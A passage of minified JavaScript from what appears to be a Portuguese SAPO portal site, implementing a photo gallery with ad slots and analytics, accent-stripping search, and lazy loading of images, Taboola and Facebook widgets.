_.index=parseInt(n,10);if(!isNaN(_.index)){_.showAnimationDuration=0,_.hideAnimationDuration=0,_.closeOnScroll=!1,_.fullscreenEl=!1,_.closeElClasses=[],_.shareButtons=[{id:"facebook",label:"Partilhar no Facebook",url:"https://www.facebook.com/sharer/sharer.php?u={{url}}"},{id:"twitter",label:"Partilhar no Twitter",url:"https://twitter.com/intent/tweet?text={{text}}&url={{url}}"}],y=new PhotoSwipe(w,PhotoSwipeUI_Default,o,_);var S={};Ink.ss(".pswp-ad").forEach((function(e){d&&(S.oldPubTarget=e.getAttribute("data-pub-target"),S.oldPubSiteId=e.getAttribute("data-pub-siteid"),S.oldPubPageId=e.getAttribute("data-pub-pageid"),l=h.pubTarget,e.setAttribute("data-pub-target",h.pubTarget),e.setAttribute("data-pub-siteid",h.siteId),e.setAttribute("data-pub-pageid",h.pageId))})),h.pubTarget=S.oldPubTarget,h.siteId=S.oldPubSiteId,h.pageId=S.oldPubPageId;if(y.listen("gettingData",(function(e,t){if(f&&(t.src=t.src+"&webp=1",t.msrc=t.msrc+"&webp=1"),1==t.w||1==t.h){var n=new Image;n.onload=function(){t.w=this.width,t.h=this.height,y.invalidateCurrItems(),y.updateSize(!0)},n.src=t.src}})),y.listen("close",(function(){setTimeout((function(){k=999999,document.title=c,t.removeClassName(Ink.s(".pswp-ctn"),"open"),O(T),window.dataLayer=window.dataLayer||[],window.dataLayer.push({page_type:s,page_number:void 0}),t.removeClassName(Ink.s(".pswp-ctn"),"show-related-articles"),document.removeEventListener("click",g),document.removeEventListener("keydown",v),d&&(dataLayer.push(dataLayer[0]),Ink.ss(".pswp-ad").forEach((function(e){l=h.pubTarget,e.setAttribute("data-pub-target",h.pubTarget),e.setAttribute("data-pub-siteid",h.siteId),e.setAttribute("data-pub-pageid",h.pageId)})))}),0)})),y.listen("afterChange",(function(){if(y.currItem&&1==y.currItem.w&&1==y.currItem.h)console.log("IMAGE NO SIZE");else{document.title=y.currItem.dataTitle,m&&A(y.currItem.shareUrl);var e=y.getCurrentIndex();if(0==u&&(Ink.ss(".pswp-ad").forEach((function(e){e.setAttribute("data-pub-target",l+(""!=y.currItem.extraMetadata&&l.indexOf("extraMetadata")<0?"extraMetadata="+y.currItem.extraMetadata:""))})),"undefined"!=typeof SAPO&&SAPO.CPU&&SAPO.CPU.afterProcess((function(){SAPO.CPU.refresh(".pswp-ad")}))),u<2?u++:u=0,window.dataLayer=window.dataLayer||[],window.dataLayer.push({page_type:"gallery",page_number:"photo-"+(y.getCurrentIndex()+1),first_photo:U}),!U&&r.trackGTMPageView(),U=!1,k==I&&0==e&&b&&!p&&y.items&&y.items.length>1){if(C)return;setTimeout((function(){document.addEventListener("click",g,!1),document.addEventListener("keydown",v,!1)}),0),t.addClassName(Ink.s(".pswp-ctn"),"show-related-articles"),"undefined"!=typeof SAPO&&SAPO.LAZYPICTURE&&SAPO.LAZYPICTURE.refresh(),C=!0}y.getCurrentIndex()===y.items.length-1&&(k=e),I=y.getCurrentIndex()}})),y.listen("shareLinkClick",(function(e,t){var n=t.className.replace("pswp__share--","");t.href=[r.getSocialShareUrl(n),encodeURIComponent([y.currItem.shareUrl,r.swaShareAttrs(y.currItem.projectName,n,y.currItem.title,!1)].join(""))].join("")})),/^(tiny|small|medium)$/.test(Ink.UI.Common_1.currentLayout())){var E,D=(Ink.s(".pswp"),{showAd:"show-mobile-ad",enterLeft:"pswp-mobile-ad-enter-left",enterRight:"pswp-mobile-ad-enter-right",exitLeft:"pswp-mobile-ad-exit-left",exitRight:"pswp-mobile-ad-exit-right"}),P=".pswp-mobile-ad",N=Ink.s(".pswp__container"),M=3,L=-1,R=function(){return t.hasClassName(w,D.showAd)},F=function(){clearTimeout(E),Ink.s(P)&&(Ink.s(P).innerHTML=""),setTimeout((function(){var e=L;L=-1,y.goTo(e)}),0),setTimeout((function(){N.style.visibility="visible"}),150),setTimeout((function(){t.removeClassName(w,[D.showAd,D.enterRight,D.enterLeft,D.exitRight,D.exitLeft])}),300),e.stopObserving(Ink.s(".pswp-ctn"),"click",H)},j=function(){t.hasClassName(Ink.s("body"),"hide-ads")||(M=4,N.style.visibility="hidden",t.addClassName(w,D.showAd),"undefined"!=typeof SAPO&&SAPO.CPU&&SAPO.CPU.afterProcess((function(){SAPO.CPU.refresh(P)})),L=y.getCurrentIndex(),E=setTimeout(F,1e4),e.observe(Ink.s(".pswp-ctn"),"click",H))};window.onpopstate=function(e){R()&&F()},y.listen("beforeChange",(function(e){R()&&-1!==L?(t.addClassName(w,e>0?D.exitLeft:D.exitRight),F()):0==M--&&(t.addClassName(w,e>0?D.enterRight:D.enterLeft),j())}));var H=function(e){e.target!==Ink.s(P)&&F()}}t.addClassName(Ink.s(".pswp-ctn"),"open"),y.init()}}))}r.includes(window.location.href,"manchetes")&&(m=!1);for(var b=n.getAttribute("data-ps-photogallery-id"),w=Ink.s("#pswp-related-articles-ctn"),k=9999999,I=99999999,C=!1,x=function(e,n){if(d){var r=e.getAttribute("data-ps-ajax-trigger"),s=e.getAttribute("href");!s&&(s="");var l=a.findUpwardsByTag(e,"li").children[0];t.addClassName(l,"loading"),new o(r,{method:"GET",onSuccess:function(i,r){var a=i.responseJSON;a.forEach((function(t){t.dataTitle=t.title,t.title=t.titleHtml,t.shareUrl=e.href})),new o(s,{method:"GET",onSuccess:function(e,t){var i=JSON.parse(t.dataLayer),o=JSON.parse(t.publicity);dataLayer.push(i),h.siteId=o.siteId,h.pageId=o.galleryPageId,h.pubTarget=o.target,n(a)},parameters:{show_data_layer:!0},onComplete:function(){t.removeClassName(l,"loading")}})}})}else{var c=null,u=[];if(t.hasClassName(e.parentNode,"photo-swipe")?c=e.parentNode:t.hasClassName(e.parentNode.parentNode,"photo-swipe")?c=e.parentNode.parentNode:t.hasClassName(e.parentNode.parentNode.parentNode,"photo-swipe")&&(c=e.parentNode.parentNode.parentNode),null!=c&&(u=Ink.ss("[data-ps-trigger]",c)),0==u.length&&(u=Ink.ss("li",e.parentNode.parentNode)),0==u.length&&(u=Ink.ss("li",e.parentNode.parentNode.parentNode)),0==u.length&&(u=Ink.ss("li",e.parentNode.parentNode.parentNode.parentNode.parentNode)),e.getAttribute("data-ps-single-photo"))(u=[]).push(e);for(var p,f,m,g,v,y,_=u.length,b=[],w=0;w<_;w++)1===u[w].nodeType&&(m=Ink.s("picture",u[w]),(p=[parseInt(m.getAttribute("data-original-w"),10),parseInt(m.getAttribute("data-original-h"),10)])[0]>=p[1]?(v=Math.min(p[0],2100),g=p[0]/v,y=Math.min(p[1]/g,2100*g)):(y=Math.min(p[1],2100),g=p[1]/y,v=Math.min(p[0]/g,2100*g)),null!=m.getAttribute("data-original-src")&&m.setAttribute("data-msrc","//thumbs.web.sapo.io/?pic="+("//"==m.getAttribute("data-original-src").substring(0,2)?"http:":"")+m.getAttribute("data-original-src")+"&W="+parseInt(v)+"&H="+parseInt(y)+"&delay_optim=1&tv=2"),"//thumbs.web.sapo.io/"==i.parseUrl(m.getAttribute("data-original-src")).path&&m.setAttribute("data-msrc",m.getAttribute("data-original-src")),(f={src:m.getAttribute("data-msrc"),w:v,h:y,title:m.getAttribute("data-caption")||m.alt||m.title||"",extraMetadata:m.getAttribute("data-data-extrameta")||"",dataTitle:m.getAttribute("data-title")||"",msrc:m.getAttribute("data-msrc")||m.getAttribute("data-title")||"",shareUrl:m.getAttribute("data-share-url")||window.location.href.substring(0,window.location.href.indexOf("#"))||"",projectName:m.getAttribute("data-social-share-name")||"sapo"}).el=m,b.push(f));n(b)}},S=function e(t,n){return t&&(n(t)?t:e(t.parentNode,n))},E=function(){b&&new o("/api/service/photo_gallery_related/"+b,{method:"GET",onSuccess:function(e,t){var n=e.responseText;w.innerHTML="",w.innerHTML=n,p=!1},onFailure:function(){p=!0},on404:function(){p=!0}})},T=window.location.href,A=function(e){if(e||(e="#"),!t.hasClassName(Ink.s(".pswp"),"show-mobile-ad")){var n=document.createElement("a");n.href=e,n.host=location.host,n.protocol=location.protocol,history.replaceState({},c,n.href)}},O=function(e){var t=document.createElement("a");t.href=e,t.host=location.host,t.protocol=location.protocol,history.replaceState({},"",t.href),history.pushState({},c,e)},D="a[data-ps-trigger]",P=Ink.ss(D,n),N=0,M=P.length;N<M;N++)P[N].setAttribute("data-pswp-uid",y);e.observeDelegated(n,"click",D,(function(e){e=e||window.event,C=!1,e.preventDefault?e.preventDefault():e.returnValue=!1,d=!1;var t=e.target||e.srcElement,n=S(t,(function(e){return e.getAttribute("data-pswp-uid")}));if(n){var i=n;_(S(t,(function(e){return e.getAttribute("data-index")})).getAttribute("data-index")||0,i)}})),n.getAttribute("data-ps-ajax-trigger")&&(n.setAttribute("data-pswp-uid",1),e.observe(n,"click",(function(e){(e=e||window.event).preventDefault?e.preventDefault():e.returnValue=!1,d=!0;var t=e.currentTarget||e.target||e.srcElement;b=n.getAttribute("data-ps-photogallery-id"),_(0,t)})));var L=function(){var e=window.location.hash.substring(1),t={};if(e.length<5)return t;for(var n=e.split("&"),i=0;i<n.length;i++)if(n[i]){var o=n[i].split("=");o.length<2||(t[o[0]]=o[1])}return t.gid&&(t.gid=t.gid),t}(),U=!1;!n.getAttribute("data-ps-ajax-trigger")&&L.gid&&L.gid==y&&L.pid&&(U=!0,_(L.pid,Ink.s("[data-pswp-uid="+L.gid+"]"),0,!0)),Ink.ss("[data-newspaper-id]",n)&&window.location.href.replace(/jornais\/([a-zA-Z-]+)\/(\d+)/,(function(e,t,i){var o=!n.getAttribute("data-pswp-open");!r.includes(window.location.href,"arquivo")&&o&&Ink.s('[data-newspaper-id="'+i+'"]')&&Ink.s('[data-newspaper-id="'+i+'"]').click()}))},_=0;_<Ink.ss(".photo-swipe").length;_++)y(Ink.ss(".photo-swipe")[_],_+1);for(_=0;_<Ink.ss("a[data-ps-ajax-trigger]").length;_++)y(Ink.ss("a[data-ps-ajax-trigger]")[_],_+1)})),function(e){"use strict";Ink.createModule("SAPO.Diacritics",1,[],(function(){for(var e=[{base:"A",letters:"AⒶＡÀÁÂẦẤẪẨÃĀĂẰẮẴẲȦǠÄǞẢÅǺǍȀȂẠẬẶḀĄȺⱯ"},{base:"AA",letters:"Ꜳ"},{base:"AE",letters:"ÆǼǢ"},{base:"AO",letters:"Ꜵ"},{base:"AU",letters:"Ꜷ"},{base:"AV",letters:"ꜸꜺ"},{base:"AY",letters:"Ꜽ"},{base:"B",letters:"BⒷＢḂḄḆɃƂƁ"},{base:"C",letters:"CⒸＣĆĈĊČÇḈƇȻꜾ"},{base:"D",letters:"DⒹＤḊĎḌḐḒḎĐƋƊƉꝹ"},{base:"DZ",letters:"ǱǄ"},{base:"Dz",letters:"ǲǅ"},{base:"E",letters:"EⒺＥÈÉÊỀẾỄỂẼĒḔḖĔĖËẺĚȄȆẸỆȨḜĘḘḚƐƎ"},{base:"F",letters:"FⒻＦḞƑꝻ"},{base:"G",letters:"GⒼＧǴĜḠĞĠǦĢǤƓꞠꝽꝾ"},{base:"H",letters:"HⒽＨĤḢḦȞḤḨḪĦⱧⱵꞍ"},{base:"I",letters:"IⒾＩÌÍÎĨĪĬİÏḮỈǏȈȊỊĮḬƗ"},{base:"J",letters:"JⒿＪĴɈ"},{base:"K",letters:"KⓀＫḰǨḲĶḴƘⱩꝀꝂꝄꞢ"},{base:"L",letters:"LⓁＬĿĹĽḶḸĻḼḺŁȽⱢⱠꝈꝆꞀ"},{base:"LJ",letters:"Ǉ"},{base:"Lj",letters:"ǈ"},{base:"M",letters:"MⓂＭḾṀṂⱮƜ"},{base:"N",letters:"NⓃＮǸŃÑṄŇṆŅṊṈȠƝꞐꞤ"},{base:"NJ",letters:"Ǌ"},{base:"Nj",letters:"ǋ"},{base:"O",letters:"OⓄＯÒÓÔỒỐỖỔÕṌȬṎŌṐṒŎȮȰÖȪỎŐǑȌȎƠỜỚỠỞỢỌỘǪǬØǾƆƟꝊꝌ"},{base:"OI",letters:"Ƣ"},{base:"OO",letters:"Ꝏ"},{base:"OU",letters:"Ȣ"},{base:"P",letters:"PⓅＰṔṖƤⱣꝐꝒꝔ"},{base:"Q",letters:"QⓆＱꝖꝘɊ"},{base:"R",letters:"RⓇＲŔṘŘȐȒṚṜŖṞɌⱤꝚꞦꞂ"},{base:"S",letters:"SⓈＳẞŚṤŜṠŠṦṢṨȘŞⱾꞨꞄ"},{base:"T",letters:"TⓉＴṪŤṬȚŢṰṮŦƬƮȾꞆ"},{base:"TZ",letters:"Ꜩ"},{base:"U",letters:"UⓊＵÙÚÛŨṸŪṺŬÜǛǗǕǙỦŮŰǓȔȖƯỪỨỮỬỰỤṲŲṶṴɄ"},{base:"V",letters:"VⓋＶṼṾƲꝞɅ"},{base:"VY",letters:"Ꝡ"},{base:"W",letters:"WⓌＷẀẂŴẆẄẈⱲ"},{base:"X",letters:"XⓍＸẊẌ"},{base:"Y",letters:"YⓎＹỲÝŶỸȲẎŸỶỴƳɎỾ"},{base:"Z",letters:"ZⓏＺŹẐŻŽẒẔƵȤⱿⱫꝢ"},{base:"a",letters:"aⓐａẚàáâầấẫẩãāăằắẵẳȧǡäǟảåǻǎȁȃạậặḁąⱥɐ"},{base:"aa",letters:"ꜳ"},{base:"ae",letters:"æǽǣ"},{base:"ao",letters:"ꜵ"},{base:"au",letters:"ꜷ"},{base:"av",letters:"ꜹꜻ"},{base:"ay",letters:"ꜽ"},{base:"b",letters:"bⓑｂḃḅḇƀƃɓ"},{base:"c",letters:"cⓒｃćĉċčçḉƈȼꜿↄ"},{base:"d",letters:"dⓓｄḋďḍḑḓḏđƌɖɗꝺ"},{base:"dz",letters:"ǳǆ"},{base:"e",letters:"eⓔｅèéêềếễểẽēḕḗĕėëẻěȅȇẹệȩḝęḙḛɇɛǝ"},{base:"f",letters:"fⓕｆḟƒꝼ"},{base:"g",letters:"gⓖｇǵĝḡğġǧģǥɠꞡᵹꝿ"},{base:"h",letters:"hⓗｈĥḣḧȟḥḩḫẖħⱨⱶɥ"},{base:"hv",letters:"ƕ"},{base:"i",letters:"iⓘｉìíîĩīĭïḯỉǐȉȋịįḭɨı"},{base:"j",letters:"jⓙｊĵǰɉ"},{base:"k",letters:"kⓚｋḱǩḳķḵƙⱪꝁꝃꝅꞣ"},{base:"l",letters:"lⓛｌŀĺľḷḹļḽḻſłƚɫⱡꝉꞁꝇ"},{base:"lj",letters:"ǉ"},{base:"m",letters:"mⓜｍḿṁṃɱɯ"},{base:"n",letters:"nⓝｎǹńñṅňṇņṋṉƞɲŉꞑꞥ"},{base:"nj",letters:"ǌ"},{base:"o",letters:"oⓞｏòóôồốỗổõṍȭṏōṑṓŏȯȱöȫỏőǒȍȏơờớỡởợọộǫǭøǿɔꝋꝍɵ"},{base:"oi",letters:"ƣ"},{base:"ou",letters:"ȣ"},{base:"oo",letters:"ꝏ"},{base:"p",letters:"pⓟｐṕṗƥᵽꝑꝓꝕ"},{base:"q",letters:"qⓠｑɋꝗꝙ"},{base:"r",letters:"rⓡｒŕṙřȑȓṛṝŗṟɍɽꝛꞧꞃ"},{base:"s",letters:"sⓢｓßśṥŝṡšṧṣṩșşȿꞩꞅẛ"},{base:"t",letters:"tⓣｔṫẗťṭțţṱṯŧƭʈⱦꞇ"},{base:"tz",letters:"ꜩ"},{base:"u",letters:"uⓤｕùúûũṹūṻŭüǜǘǖǚủůűǔȕȗưừứữửựụṳųṷṵʉ"},{base:"v",letters:"vⓥｖṽṿʋꝟʌ"},{base:"vy",letters:"ꝡ"},{base:"w",letters:"wⓦｗẁẃŵẇẅẘẉⱳ"},{base:"x",letters:"xⓧｘẋẍ"},{base:"y",letters:"yⓨｙỳýŷỹȳẏÿỷẙỵƴɏỿ"},{base:"z",letters:"zⓩｚźẑżžẓẕƶȥɀⱬꝣ"}],t={},n=0;n<e.length;n++)for(var i=e[n].letters.split(""),o=0;o<i.length;o++)t[i[o]]=e[n].base;return{remove:function(e){return e.replace(/[^A-Za-z0-9\s]/g,(function(e){return t[e]||e}))}}}))}(),function(e,t,n){"use strict";e.createModule("SAPO.Search",1,["Ink.Dom.Event_1","Ink.Net.Ajax_1","Ink.Util.Array_1","Ink.Dom.Element_1","Ink.UI.Common","Ink.Dom.Css_1","SAPO.Diacritics_1"],(function(i,o,r,a,s,l,c){return function(u,d){function h(){return S.container}function p(){var e=s.getInstanceFromSelector(h());return e.length?e[0]:null}function f(){return A[D]}function m(e){return"function"==typeof S.removeResultHighlight&&S.removeResultHighlight(O[D]),e>-1&&e<O.length?(D=e,"function"==typeof S.addResultHighlight&&S.addResultHighlight(O[D]),O[D]):void(D=-1)}function g(){m(-1)}function v(e){var t,n,o=e.code;for(t in S.keyCodes)if(S.keyCodes.hasOwnProperty(t)&&r.inArray(o,S.keyCodes[t])){n=t;break}n&&("next"===n&&D<O.length-1?(m(D+1),i.stop(e)):"previous"===n&&D>-1?(0===D&&(a.findUpwardsByClass(S.searchElem,"modal-body").scrollTop=0),m(D-1),i.stop(e)):"enter"===n&&"function"==typeof S.enterHandler&&S.enterHandler())}function y(e){return!!(e.ctrlKey||e.shiftKey||e.altKey||e.metaKey)||!!function(e){return r.inArray(e.tagName.toLowerCase(),["input","textarea","div","object"])}(e.target)||void(S.shortcuts&&S.shortcuts.hasOwnProperty(e.code)&&"function"==typeof S.shortcuts[e.code]&&(e.preventDefault(),S.shortcuts[e.code].call(this,e)))}function _(){S.searchElem.value=""}function b(){S.target.innerHTML="",l.removeClassName(S.statusCtn,"empty")}function w(e){l.blinkClass(S.statusCtn,"loading",3e3),b(),"function"==typeof S.fetchBefore&&S.fetchBefore(),T=e,P=new o(S.endpoint+e,{method:"GET",onSuccess:k,onFailure:I,onComplete:C})}function k(e){E&&(A=e.responseJSON.searchResults.slice(0,S.maxResults),r.forEach(A,(function(e){"function"==typeof S.insertItem&&S.insertItem(S.target,e)})),O=S.target.children,A.length||l.addClassName(S.statusCtn,"empty"),"function"==typeof S.fetchSuccess&&S.fetchSuccess(T,A,O))}function I(){"function"==typeof S.fetchFailure&&S.fetchFailure()}function C(){g(),P=null,"function"==typeof S.fetchAfter&&S.fetchAfter(T,A,O),l.removeClassName(S.statusCtn,"loading")}function x(o,r){if(o=e.i(o)||e.s(o),!a.hasAttribute(o,"search-initialized")){!function(t,n){var i,o=e.extendObj({},N),r=a.data(t);for(i in r)r.hasOwnProperty(i)&&o.hasOwnProperty(i)&&(o[i]=r[i]);(S=e.extendObj({},N,o,n)).searchElem=e.i(t)||e.s(t),S.target=e.i(S.target)||e.s(S.target),S.container=e.i(S.container)||e.s(S.container),S.statusCtn=e.i(S.statusCtn)||e.s(S.statusCtn)||S.container,S.jsonp=S.jsonp&&"false"!==S.jsonp&&"0"!==S.jsonp}(o,r);var s=i.throttle((function(e){w(e)}),S.throttle);i.observe(S.searchElem,"blur",g),i.observe(S.searchElem,"keydown",v),i.observe(S.searchElem,S.event,(function(e){i.stop(e),P&&(P.abort(),P=null);var t=e.target.value;(E=t&&t.length>=S.minChars)?s(t):b()})),i.observe(n,"keydown",y),i.observe(e.s(".modal-close"),"click",(function(e){S.modal.isOpen()||i.stopPropagation(e)}),!0);var l=10,c=t.setInterval((function(){if(S.modal=p(),(S.modal||0==--l)&&t.clearInterval(c),S.modal){var o=S.modal._options.onShow,r=S.modal._options.onDismiss,a=/iphone|ipad|ipod|android/i.test(navigator.userAgent);S.modal._options.onShow=function(){_(),b(),a&&(n.body.setAttribute("data-modal-position",n.body.style.position),n.body.style.position="fixed",i.observe(u,"focus",(function(){t.scrollTo(0,0)})),i.observe(u,"blur",(function(){t.scrollTo(0,0)})),i.observe(".modal-close","touchstart",(function(){S.modal.dismiss()}))),e.s(u).focus(),"function"==typeof o&&o.apply(null,Array.prototype.slice.call(arguments))},S.modal._options.onDismiss=function(){_(),b(),a&&(n.body.style.position=n.body.getAttribute("data-modal-position"),n.body.removeAttribute("data-modal-position"),t.scrollTo(0,0)),e.s(u).blur(),"function"==typeof r&&r.apply(null,Array.prototype.slice.call(arguments))}}}),500);o.setAttribute("search-initialized",!0)}}var S={},E=!1,T="",A=[],O=[],D=-1,P=null,N={searchElem:null,target:null,container:null,statusCtn:null,endpoint:"/api/",throttle:500,minChars:3,maxResults:10,event:"input",keyCodes:{enter:["Enter"],next:["ArrowDown"],previous:["ArrowUp"]},shortcuts:{KeyF:function(){S.openSearch()},Escape:function(){S.escapeHandler()}},fetchBefore:function(e){},fetchAfter:function(e,t,n){},fetchSuccess:function(e,t,n){var o=c.remove(e.toLowerCase()).split(/[^A-zÀ-ÿ]/g);if(r.forEach(n,(function(e,t){l.addClassName(e,"result-item");var n=e.getElementsByClassName("title")[0],i=e.getElementsByClassName("excerpt")[0];n.innerHTML=n.textContent.replace(/([A-zÀ-ÿ]+)/g,(function(e,t){return o.indexOf(c.remove(t.toLowerCase()))>-1?'<span class="highlight">'+t+"</span>":t})),i&&(i.innerHTML=i.textContent.replace(/([A-zÀ-ÿ]+)/g,(function(e,t){return o.indexOf(c.remove(t.toLowerCase()))>-1?'<span class="highlight">'+t+"</span>":t})))})),"function"==typeof S.insertItem&&n.length){var s=S.insertItem(S.target,{url:"#",title:"Ver todos os resultados",date:null});l.addClassName(s,"see-all-results"),i.observe(s,"click",(function(e){i.stopDefault(e),a.findUpwardsByTag(S.searchElem,"form").submit()}))}},fetchFailure:function(){e.error("Error fetching query results")},insertItem:function(e,t){var n=a.create("li",{insertBottom:e}),i=a.create("a",{href:t.url,insertBottom:n});return a.create("span",{className:"title",setTextContent:t.title,insertBottom:i}),t.excerpt&&a.create("span",{className:"excerpt",setTextContent:t.excerpt,insertBottom:i}),a.create("span",{className:"label",setTextContent:t.date,insertBottom:i}),n},addResultHighlight:function(e){if(e){l.addClassName(e,"active");var t=a.findUpwardsByClass(e,"modal-body"),n=t.offsetTop,i=n+t.clientHeight,o=e.offsetTop,r=o+e.clientHeight;o-parseFloat(l.getStyle(t.parentNode,"padding-top"))<t.scrollTop?t.scrollTop=o-n-5:r>i+t.scrollTop&&(t.scrollTop=Math.ceil(Math.min(r-i+5,t.scrollHeight-t.clientHeight)))}},removeResultHighlight:function(e){e&&l.removeClassName(e,"active")},escapeHandler:function(){"function"==typeof S.closeSearch&&S.closeSearch()},enterHandler:function(){D<0||D>O.length-1||(t.location.href=f().url,"function"==typeof S.escapeHandler&&S.escapeHandler())},openSearch:function(){S.modal&&S.modal.open()},closeSearch:function(){S.modal&&S.modal.dismiss()}};return x(u,d),{init:x,clearQuery:_,clearResults:b,getContainer:h,getCurrentResultElem:function(){return O[D]},getCurrentResultObj:f}}}))}(Ink,window,document),Ink.requireModules(["SAPO.Search_1"],(function(e){"use strict";Ink.s('#global-search[type="search"]')&&new e('#global-search[type="search"]')})),function(){"use strict";var e=window,t=document,n=!1,i=!1,o=!!navigator&&(navigator.connection||navigator.mozConnection||navigator.webkitConnection),r={debug:!1,doubleSize:!1,quality:25,showRetina:!(o&&(["slow-2g","2g","3g"].indexOf(o.effectiveType)>-1||"cellular"===o.type)),selector:"data-lazy",picture:'picture[data-lazy="true"]',margin:"250",lazy:["","img","style","taboola","facebook","script","sapovideos","iframe","sapofun","widget"]};!e.SAPO&&(e.SAPO={}),!e.SAPO.LAZYPICTURE&&(e.SAPO.LAZYPICTURE=function(){function o(e,n){return(n||t).querySelector(e)}function a(e,n){return(n||t).querySelectorAll(e)}function s(e){if(r.doubleSize){if((i=/&W=([0-9]{1,4})&H=([0-9]{1,4})/g.exec(e))&&i.length>2){var t=2*parseInt(i[1]),n=2*parseInt(i[2]);(t>2100||n>2100)&&(t>=n?(n=2100*n/t,t=2100):t<n&&(t=2100*t/n,n=2100)),o=(o=(o=e).replace("&W="+Math.ceil(i[1]),"&W="+Math.ceil(t))).replace("&H="+Math.ceil(i[2]),"&H="+Math.ceil(n))}return o+"&Q="+r.quality+(r.showRetina?" 1x, "+o+" 2x":"")}if(!r.showRetina)return e;var i;if((i=/[&\?]W=([0-9]{1,4})&H=([0-9]{1,4})/g.exec(e))&&i.length>2){var o;t=2*parseInt(i[1]),n=2*parseInt(i[2]);return(t>2100||n>2100)&&(t>=n?(n=2100*n/t,t=2100):t<n&&(t=2100*t/n,n=2100)),e+" 1x, "+(o=(o=(o=(o=e).replace("?W="+Math.ceil(i[1]),"?W="+Math.ceil(t))).replace("&W="+Math.ceil(i[1]),"&W="+Math.ceil(t))).replace("&H="+Math.ceil(i[2]),"&H="+Math.ceil(n)))+" 2x"}return e}function l(t,n,i){n.addEventListener?n.addEventListener(t,i,!1):n.attachEvent&&n.attachEvent("on"+t,(function(t){i(t||e.event)}))}function c(e){e.init&&(e.init(),e.removeAttribute(r.selector+"-widget"),e.rendering&&clearInterval(e.rendering),delete e.init,delete e.rendering)}function u(t){return r.lazy.forEach((function(e){if(t.hasAttribute(r.selector+""+(e?"-"+e:""))&&"false"===t.getAttribute(r.selector+""+(e?"-"+e:"")))return!0})),!!t.offsetParent&&(!("onscroll"in window)||function(t,n){"boolean"==typeof n&&(n={partial:n,margin:0});var i=t.getBoundingClientRect(),o=e.innerWidth,r=e.innerHeight;return n.partial?i.bottom+n.margin>0&&i.left-n.margin<o&&i.top-n.margin<r&&i.right+n.margin>0:i.top+n.margin>0&&i.right-n.margin<o&&i.bottom-n.margin<r&&i.left+n.margin>0}(t,{partial:!0,margin:r.margin}))&&"none"!==e.getComputedStyle(t).display&&"hidden"!==e.getComputedStyle(t).visibility&&t.offsetWidth>0&&t.offsetHeight>0}function d(e){if(e.hasAttribute(r.selector+"-style"))return e.setAttribute("style",(e.getAttribute("style")?e.getAttribute("style")+"; ":"")+e.getAttribute(r.selector+"-style")),void e.removeAttribute(r.selector+"-style");if(e.hasAttribute(r.selector+"-sapofun")){var t=document.createElement("script");return t.setAttribute("data-fun",e.getAttribute("data-sapofun-id")),t.src="https://fun.sapo.pt/assets/static/js/SAPOFun.js",t&&e.appendChild(t),void e.removeAttribute(r.selector+"-sapofun")}if(e.hasAttribute(r.selector+"-sapovideos")){var n=document.createElement("iframe");return n.frameBorder=0,n.scrolling="no",n.src=e.getAttribute("data-sapovideos-src"),n.allowFullscreen=!0,n.setAttribute("mozallowfullscreen",""),n.setAttribute("webkitallowfullscreen",""),n&&e.appendChild(n),void e.removeAttribute(r.selector+"-sapovideos")}if(e.hasAttribute(r.selector+"-iframe")){if(!e.hasAttribute("data-iframe-src"))return;return e.src=e.getAttribute("data-iframe-src"),void e.removeAttribute(r.selector+"-iframe")}if(e.hasAttribute(r.selector+"-img")){if(!e.hasAttribute("data-src"))return;return e.src=e.getAttribute("data-src").includes("[timestamp]")?e.getAttribute("data-src").replace("[timestamp]",(new Date).getTime()):e.getAttribute("data-src"),void e.removeAttribute(r.selector+"-img")}if(e.hasAttribute(r.selector+"-taboola"))return window._taboola=window._taboola||[],_taboola.push({article:"auto"}),function(e,t,n,i){document.getElementById(i)||(e.async=1,e.src=n,e.id=i,t.parentNode.insertBefore(e,t))}(document.createElement("script"),document.getElementsByTagName("script")[0],"//cdn.taboola.com/libtrc/"+e.getAttribute("data-taboola-account")+"/loader.js","tb_loader_script"),window.performance&&"function"==typeof window.performance.mark&&window.performance.mark("tbl_ic"),_taboola.push({mode:e.getAttribute("data-taboola-mode"),container:e.getAttribute("data-taboola-container"),placement:e.getAttribute("data-taboola-placement"),target_type:e.getAttribute("data-taboola-type")}),void e.removeAttribute(r.selector+"-taboola");if(e.hasAttribute(r.selector+"-facebook"))return function(t,n,i){var o,r=t.getElementsByTagName(n)[0];if(!t.getElementById(i)){var a=function(n){if(!(n&&window.FB?document.querySelector(".fb_iframe_widget"):null)){var i={view:document.querySelector("#comentarios .fb-comments"),error:document.querySelector("#comentarios [data-fb-comments-err]")};i.view&&i.view.classList&&i.view.classList.add("hide-all"),i.error&&i.error.classList&&i.error.classList.remove("hide-all")}t.getElementById(e.getAttribute("data-facebook-comment-id")).classList.remove("loading")};(o=t.createElement(n)).id=i,o.onload=function(){setTimeout((function(){window.FB?window.FB.getLoginStatus((function(e){a(e&&e.status&&"unknown"!=e.status)})):a()}),1500)},o.src="https://connect.facebook.net/pt_PT/sdk.js#xfbml=1&version=v13.0"+(e.getAttribute("data-facebook-app-id")?"&appId="+e.getAttribute("data-facebook-app-id"):"")+"&autoLogAppEvents=1",r.parentNode.insertBefore(o,r)}}(document,"script","facebook-jssdk"),void e.removeAttribute(r.selector+"-facebook");if(e.hasAttribute(r.selector+"-script")){var i=e.getAttribute("data-src");if(i){e.removeAttribute(r.selector+"-script"),e.removeAttribute("data-src");var l=Ink.loadScript(i);l&&e.appendChild(l)}}else{if(e.hasAttribute(r.selector+"-widget"))return void(e.init?c(e):e.rendering||(e.rendering=setInterval((function(){c(e)}),150)));for(var u=a("source",e),d=o("img",e),h=!1,p=0;p<u.length;p++)u[p].hasAttribute("data-srcset")&&(u[p].setAttribute("srcset",s(u[p].getAttribute("data-srcset"))),u[p].removeAttribute("data-srcset"),h||"image/webp"!==u[p].getAttribute("type")||(h=!0));d&&d.getAttribute("data-src")&&(d.setAttribute("src",d.getAttribute("data-src")),d.setAttribute("srcset",s(d.getAttribute("data-src"))),d.removeAttribute("data-src")),e.setAttribute(r.selector+"","done"),e.className.indexOf("loaded")<0&&(e.className=e.className+" loaded",!h&&r.debug&&(e.style=e.style.cssText+"border: 4px solid red;"))}}function h(e,t){t=t||0;var n,i=0;return function o(){var r=+new Date,a=r-i,s=arguments,l=this;return a>=t?(i=r,e.apply(this,arguments)):(n&&clearTimeout(n),void(n=setTimeout((function(){return n=null,o.apply(l,s)}),t-a)))}}function p(){if(!i)return!1;if(!n){n=!0;for(var e=a(r.picture),t=0;t<e.length;t+=1)u(e[t])&&d(e[t]);r.lazy.forEach((function(e){for(var 